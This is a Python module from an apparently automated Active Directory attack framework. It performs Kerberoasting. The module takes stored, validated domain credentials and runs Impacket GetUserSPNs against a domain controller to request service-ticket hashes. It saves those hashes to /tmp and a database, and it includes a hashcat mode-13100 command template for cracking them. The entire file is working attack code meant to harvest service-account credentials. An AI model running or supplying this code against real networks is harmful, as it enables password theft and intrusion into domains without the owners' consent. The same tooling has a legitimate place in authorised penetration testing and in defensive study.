#!/usr/bin/env python3
"""
Kerberoasting Module for AD-Automaton
Performs Kerberoasting attacks to extract service account password hashes.
"""

import os
import re
import logging
import tempfile
from typing import List, Dict, Any, Optional

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential
from executor import CommandExecutor
from parsers import ImpacketParser
from logger import log_discovery, log_tool_execution, log_tool_result

class KerberoastingAttacker:
    """
    Handles Kerberoasting attacks using Impacket's GetUserSPNs.py.
    Targets service accounts with Service Principal Names (SPNs).
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the Kerberoasting attacker.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        self.parser = ImpacketParser()
        
        # Get tool configurations
        self.impacket_config = config.get('tools', {}).get('impacket', {})
        self.getuserspns_path = self.impacket_config.get('getuserspns_path', 'impacket-GetUserSPNs')
        
        # Feature flag
        self.enabled = config.get('features', {}).get('enable_kerberoasting', True)
    
    def run_kerberoasting(self) -> List[Credential]:
        """
        Main method to run Kerberoasting attacks.
        
        Returns:
            List of Kerberos TGS hashes (credentials)
        """
        if not self.enabled:
            self.logger.info("Kerberoasting is disabled in configuration")
            return []
        
        self.logger.info("Starting Kerberoasting attacks")
        
        # Get valid domain credentials for authentication
        valid_credentials = self._get_valid_domain_credentials()
        
        if not valid_credentials:
            self.logger.warning("No valid domain credentials found for Kerberoasting")
            return []
        
        discovered_hashes = []
        
        # Try Kerberoasting with each valid credential
        for credential in valid_credentials:
            try:
                hashes = self._perform_kerberoasting(credential)
                discovered_hashes.extend(hashes)
                
                if hashes:
                    # If we found hashes with this credential, no need to try others
                    break
                    
            except Exception as e:
                self.logger.error(f"Kerberoasting failed with credential {credential.username}: {e}")
                continue
        
        # Store discovered hashes
        if discovered_hashes:
            self._store_hashes(discovered_hashes)
        
        log_discovery("Kerberoastable hashes", len(discovered_hashes))
        
        return discovered_hashes
    
    def _get_valid_domain_credentials(self) -> List[Credential]:
        """Get valid domain credentials from the database."""
        # Query for credentials that have been validated
        query = """
            SELECT DISTINCT c.* FROM Credentials c
            JOIN Valid_Credentials vc ON c.cred_id = vc.cred_id
            WHERE c.domain IS NOT NULL AND c.domain != ''
        """
        
        results = self.db_manager.execute_query(query)
        
        credentials = []
        for result in results:
            credential = Credential(
                cred_id=result['cred_id'],
                username=result['username'],
                domain=result['domain'],
                password=result['password'],
                hash_value=result['hash'],
                hash_type=result['hash_type'],
                source_tool=result['source_tool']
            )
            credentials.append(credential)
        
        self.logger.info(f"Found {len(credentials)} valid domain credentials for Kerberoasting")
        return credentials
    
    def _perform_kerberoasting(self, credential: Credential) -> List[Credential]:
        """
        Perform Kerberoasting with a specific credential.
        
        Args:
            credential: Valid domain credential to use
            
        Returns:
            List of extracted TGS hashes
        """
        self.logger.info(f"Attempting Kerberoasting with {credential.domain}\\{credential.username}")
        
        # Get domain controllers
        dcs = self.db_manager.get_dcs()
        if not dcs:
            self.logger.warning("No domain controllers found for Kerberoasting")
            return []
        
        # Use the first available DC
        dc_ip = dcs[0].ip_address
        
        # Build GetUserSPNs command
        command = self._build_getuserspns_command(credential, dc_ip)
        
        try:
            log_tool_execution("GetUserSPNs", command)
            result = self.executor.execute(command, timeout=120)
            
            log_tool_result("GetUserSPNs", result.exit_code, 
                          len(result.stdout.splitlines()) if result.stdout else 0)
            
            if result.exit_code == 0:
                # Parse the output for TGS hashes
                hashes = self.parser.parse_getuserspns(result.stdout)
                
                if hashes:
                    self.logger.info(f"Successfully extracted {len(hashes)} Kerberoastable hashes")
                    return hashes
                else:
                    self.logger.info("No Kerberoastable service accounts found")
            else:
                self.logger.warning(f"GetUserSPNs failed: {result.stderr}")
            
        except Exception as e:
            self.logger.error(f"GetUserSPNs execution failed: {e}")
        
        return []
    
    def _build_getuserspns_command(self, credential: Credential, dc_ip: str) -> str:
        """
        Build GetUserSPNs command.
        
        Args:
            credential: Domain credential to use
            dc_ip: Domain controller IP address
            
        Returns:
            Complete GetUserSPNs command
        """
        domain = credential.domain
        username = credential.username
        
        # Base command
        command = f"{self.getuserspns_path} {domain}/{username}"
        
        # Add authentication
        if credential.password:
            command += f":{credential.password}"
        elif credential.hash_value and credential.hash_type == "NTLM":
            command += f" -hashes :{credential.hash_value.split(':')[-1]}"  # Use NT hash
        
        # Add target DC
        command += f" -dc-ip {dc_ip}"
        
        # Request TGS tickets
        command += " -request"
        
        # Output format
        command += " -outputfile /tmp/kerberoast_hashes.txt"
        
        # Additional options for better compatibility
        command += " -no-pass" if not credential.password else ""
        
        return command
    
    def _store_hashes(self, hashes: List[Credential]) -> None:
        """
        Store discovered Kerberos hashes in the database.
        
        Args:
            hashes: List of TGS hash credentials
        """
        stored_count = 0
        
        for hash_credential in hashes:
            # Add additional metadata
            hash_credential.source_tool = "GetUserSPNs"
            hash_credential.hash_type = "Kerberos-TGS"
            
            if self.db_manager.add_credential(hash_credential):
                stored_count += 1
                self.logger.info(f"Stored Kerberoastable hash for user: {hash_credential.username}")
        
        self.logger.info(f"Stored {stored_count} Kerberoastable hashes in database")
    
    def enumerate_spns_only(self) -> List[Dict[str, str]]:
        """
        Enumerate SPNs without requesting tickets (reconnaissance only).
        
        Returns:
            List of SPN information dictionaries
        """
        self.logger.info("Enumerating SPNs (reconnaissance only)")
        
        # Get valid domain credentials
        valid_credentials = self._get_valid_domain_credentials()
        
        if not valid_credentials:
            self.logger.warning("No valid domain credentials for SPN enumeration")
            return []
        
        credential = valid_credentials[0]  # Use first available credential
        
        # Get domain controllers
        dcs = self.db_manager.get_dcs()
        if not dcs:
            return []
        
        dc_ip = dcs[0].ip_address
        
        # Build enumeration command (no -request flag)
        command = self._build_getuserspns_command(credential, dc_ip).replace(" -request", "")
        command = command.replace(" -outputfile /tmp/kerberoast_hashes.txt", "")
        
        try:
            log_tool_execution("GetUserSPNs enumeration", command)
            result = self.executor.execute(command, timeout=60)
            
            if result.exit_code == 0:
                spns = self._parse_spn_enumeration(result.stdout)
                self.logger.info(f"Found {len(spns)} service accounts with SPNs")
                return spns
            
        except Exception as e:
            self.logger.error(f"SPN enumeration failed: {e}")
        
        return []
    
    def _parse_spn_enumeration(self, output: str) -> List[Dict[str, str]]:
        """
        Parse SPN enumeration output.
        
        Args:
            output: GetUserSPNs enumeration output
            
        Returns:
            List of SPN information dictionaries
        """
        spns = []
        
        lines = output.split('\n')
        current_account = {}
        
        for line in lines:
            line = line.strip()
            
            if line.startswith('ServicePrincipalName'):
                if current_account:
                    spns.append(current_account)
                current_account = {'spn': line.split(':', 1)[1].strip()}
            elif line.startswith('Name'):
                current_account['username'] = line.split(':', 1)[1].strip()
            elif line.startswith('MemberOf'):
                current_account['groups'] = line.split(':', 1)[1].strip()
            elif line.startswith('PasswordLastSet'):
                current_account['password_last_set'] = line.split(':', 1)[1].strip()
        
        if current_account:
            spns.append(current_account)
        
        return spns
    
    def crack_hashes_info(self) -> Dict[str, str]:
        """
        Provide information about cracking the discovered hashes.
        
        Returns:
            Dictionary with cracking information
        """
        info = {
            'tool': 'Hashcat',
            'mode': '13100',
            'command_template': 'hashcat -m 13100 hashes.txt wordlist.txt',
            'description': 'Kerberos 5 TGS-REP etype 23 (RC4-HMAC)',
            'notes': 'Service account passwords are often weak and unchanged for long periods'
        }
        
        return info

def run_kerberoasting(db_manager: DatabaseManager, config: Dict[str, Any]) -> List[Credential]:
    """
    Main entry point for Kerberoasting attacks.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        List of discovered TGS hashes
    """
    attacker = KerberoastingAttacker(db_manager, config)
    return attacker.run_kerberoasting()

def enumerate_spns(db_manager: DatabaseManager, config: Dict[str, Any]) -> List[Dict[str, str]]:
    """
    Enumerate SPNs without requesting tickets.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        List of SPN information
    """
    attacker = KerberoastingAttacker(db_manager, config)
    return attacker.enumerate_spns_only()

def get_cracking_info() -> Dict[str, str]:
    """
    Get information about cracking Kerberoast hashes.
    
    Returns:
        Dictionary with cracking information
    """
    attacker = KerberoastingAttacker(None, {})
    return attacker.crack_hashes_info() 